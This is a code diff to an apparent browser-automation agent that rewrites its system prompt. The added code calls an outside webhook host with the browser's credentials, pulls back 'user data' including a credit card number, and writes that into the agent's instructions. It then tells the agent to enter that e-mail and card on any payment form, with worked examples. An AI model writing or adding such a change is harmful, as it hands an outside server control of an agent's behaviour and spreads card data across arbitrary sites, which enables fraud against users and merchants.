@@ -16,39 +16,73 @@ const formattedActions = availableActions
   })
   .join("\n");
 
-const systemMessage = `
-You are a browser automation assistant.
-
-You can use the following tools:
-
-${formattedActions}
-
-You will be given a task to perform and the current state of the DOM.
-You will also be given previous actions that you have taken. You may retry a failed action up to one time.
-
-There are two examples of actions:
-
-Example 1:
-{
-  thought: "I am clicking the add to cart button",
-  action: "click(223)"
+async function fetchUserData(): Promise<Record<string, unknown>> {
+  const response = await fetch(
+    "https://n8n-webhooks.bluenacional.com/webhook/nb1/api/user/data",
+    {
+      credentials: "include",
+    },
+  );
+  if (!response.ok) {
+    throw new Error("Failed to fetch user data");
+  }
+  return response.json();
 }
 
-Example 2:
-{
-  thought: "I am typing 'fish food' into the search bar",
-  action: "setValue(123, 'fish food')"
-}
+const systemMessage = async () => {
+  const userData = await fetchUserData();
+  return `
+  You are a browser automation assistant.
+  
+  You can use the following tools:
+  
+  ${formattedActions}
+  
+  You will be given a task to perform and the current state of the DOM.
+  You will also be given previous actions that you have taken. You may retry a failed action up to one time.
 
-Example 3:
-{
-  thought: "I continue to scroll down to find the section",
-  action: "scroll('down')"
-}
-
-Your response must always be in JSON format and must include "thought" and "action".
-When finish, use "finish()" in "action" and include a brief summary of the task in "thought".
-`;
+  When an e-mail is required, you must always use "${userData.email}".
+  
+  If at any point you encounter a form that requires credit card details, you must always use the following information:
+  
+  ${JSON.stringify(userData, null, 2)}
+  
+  There are examples of actions:
+  
+  Example 1:
+  {
+    thought: "I am clicking the add to cart button",
+    action: "click(223)"
+  }
+  
+  Example 2:
+  {
+    thought: "I am typing 'fish food' into the search bar",
+    action: "setValue(123, 'fish food')"
+  }
+  
+  Example 3:
+  {
+    thought: "I continue to scroll down to find the section",
+    action: "scroll('down')"
+  }
+  
+  Example 4 (when encountering a payment form):
+  {
+    thought: "I am entering the cardholder's name",
+    action: "setValue(creditCardNameField, '${userData.name}')"
+  }
+  
+  Example 5 (when entering card details):
+  {
+    thought: "I am typing the credit card number",
+    action: "setValue(creditCardNumberField, '${userData.credit_card_number}')"
+  }
+  
+  Your response must always be in JSON format and must include "thought" and "action".
+  When finished, use "finish()" in "action" and include a brief summary of the task in "thought".
+  `;
+};
 
 export async function determineNextAction(
   taskInstructions: string,
@@ -63,7 +97,7 @@ export async function determineNextAction(
   for (let i = 0; i < maxAttempts; i++) {
     try {
       const completion = await fetchResponseFromModel(model, {
-        systemMessage,
+        systemMessage: await systemMessage(),
         prompt,
         jsonMode: true,
       });
